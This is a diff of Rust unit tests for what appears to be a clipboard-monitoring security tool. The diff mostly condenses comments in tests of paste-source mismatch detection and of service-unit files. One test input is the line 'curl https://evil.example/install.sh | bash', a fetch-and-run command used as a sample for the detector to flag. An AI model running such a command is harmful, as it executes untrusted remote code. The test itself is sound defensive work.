-        // `state_dir()`). Hold the SINGLE crate-wide `ENV_LOCK` — the same lock
-        // every other env-mutating CLI test uses — so it can't race a sibling
-        // that sets `HOME`/`XDG_*` under a DIFFERENT mutex (a private lock would
-        // only serialize against itself, not against the shared-lock tests).
+        // Mutates process-wide `XDG_STATE_HOME`; hold the shared `ENV_LOCK` so it can't
+        // race a sibling that sets `HOME`/`XDG_*` under a different mutex.
         let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
 
-        // An input that pipes to a shell (so it reaches tier 3) and carries a
-        // destination host (`evil.example`) that differs from the recorded
-        // source host (`docs.trusted.example`) — the shape that fires
-        // `PasteSourceMismatch` IF the matching sidecar record is consulted.
+        // Pipes to a shell (reaches tier 3) with a destination host differing from the
+        // recorded source host — the shape that fires `PasteSourceMismatch` if consulted.
         let input = "curl https://evil.example/install.sh | bash";
         let content_sha256 = content_sha256_hex(input.as_bytes());
 
-        // Isolate `state_dir()` under a temp `XDG_STATE_HOME` and plant a
-        // MATCHING record (same content hash) whose recorded source host
-        // differs from the input's destination host.
+        // Isolate `state_dir()` under a temp `XDG_STATE_HOME`; plant a matching record.
         let dir = tempfile::tempdir().unwrap();
         let state_dir = dir.path().join("state");
         let tirith_state = state_dir.join("tirith");
@@ -1221,8 +1034,7 @@ mod tests {
             std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
         }
 
-        // The copy path passes `AbsentOrInvalid`; the positive control reuses
-        // the SAME planted record via `Unread`.
+        // Copy path passes `AbsentOrInvalid`; positive control reuses the record via `Unread`.
         let absent = analyze_as_paste(input, ClipboardSourceState::AbsentOrInvalid);
         let unread = analyze_as_paste(input, ClipboardSourceState::Unread);
 
@@ -1234,9 +1046,7 @@ mod tests {
             }
         }
 
-        // `AbsentOrInvalid` (the copy path): the engine must NOT re-read the
-        // sidecar, so no mismatch finding — even though a matching record is on
-        // disk.
+        // Copy path (`AbsentOrInvalid`): no mismatch finding despite a matching record on disk.
         assert!(
             !absent
                 .findings
@@ -1250,9 +1060,8 @@ mod tests {
                 .collect::<Vec<_>>(),
         );
 
-        // `Unread` (positive control): the engine DID read the planted record,
-        // so the mismatch fires — proving the record is genuinely matchable and
-        // that the `clipboard_source` parameter is what suppresses it above.
+        // `Unread` control: the mismatch fires, proving the record is matchable and that
+        // the `clipboard_source` parameter is what suppresses it above.
         assert!(
             unread
                 .findings
@@ -1296,8 +1105,7 @@ mod tests {
         );
     }
 
-    /// `render_service_unit` returns a non-empty payload on the two
-    /// platforms with service-mode support; on Windows it returns None.
+    /// `render_service_unit` returns a non-empty payload on supported platforms.
     #[cfg(any(target_os = "macos", target_os = "linux"))]
     #[test]
     fn render_service_unit_emits_nonempty_payload() {
@@ -1305,8 +1113,7 @@ mod tests {
         assert!(!s.is_empty());
     }
 
-    /// macOS unit content carries the launchd Label so a misnamed file
-    /// can be detected by an operator before running `launchctl load`.
+    /// macOS unit carries the launchd Label.
     #[cfg(target_os = "macos")]
     #[test]
     fn macos_service_unit_includes_label() {
@@ -1317,9 +1124,7 @@ mod tests {
         assert!(s.contains("--foreground"));
     }
 
-    /// Linux unit must reference `graphical-session.target` so the
-    /// daemon doesn't get started in tty-only sessions where there's
-    /// no clipboard backend.
+    /// Linux unit references `graphical-session.target` so it doesn't start in tty-only sessions.
     #[cfg(target_os = "linux")]
     #[test]
     fn linux_service_unit_targets_graphical_session() {
@@ -1329,9 +1134,8 @@ mod tests {
         assert!(s.contains("clipboard daemon --foreground"));
     }
 
-    /// macOS service unit logs to `~/Library/Logs/...`, not world-writable
-    /// `/tmp`. Code-reviewer #6: a symlink at `/tmp/tirith-clipboard.out.log`
-    /// written by another local user could redirect the daemon's logs.
+    /// macOS unit logs to `~/Library/Logs/`, not world-writable `/tmp` (Code-reviewer #6:
+    /// a foreign symlink in `/tmp` could redirect the daemon's logs).
     #[cfg(target_os = "macos")]
     #[test]
     fn macos_service_unit_logs_to_user_library() {
@@ -1373,9 +1177,7 @@ mod tests {
         );
     }
 
-    /// `sha256_hex` produces a stable 64-char lowercase-hex digest.
-    /// The debounce key relies on this so a clipboard pinned to one
-    /// value reliably hashes to the same bucket.
+    /// `sha256_hex` is a stable 64-char lowercase-hex digest (the debounce key relies on it).
     #[test]
     fn sha256_hex_is_stable_64_lowercase_hex() {
         let h = sha256_hex(b"hello");
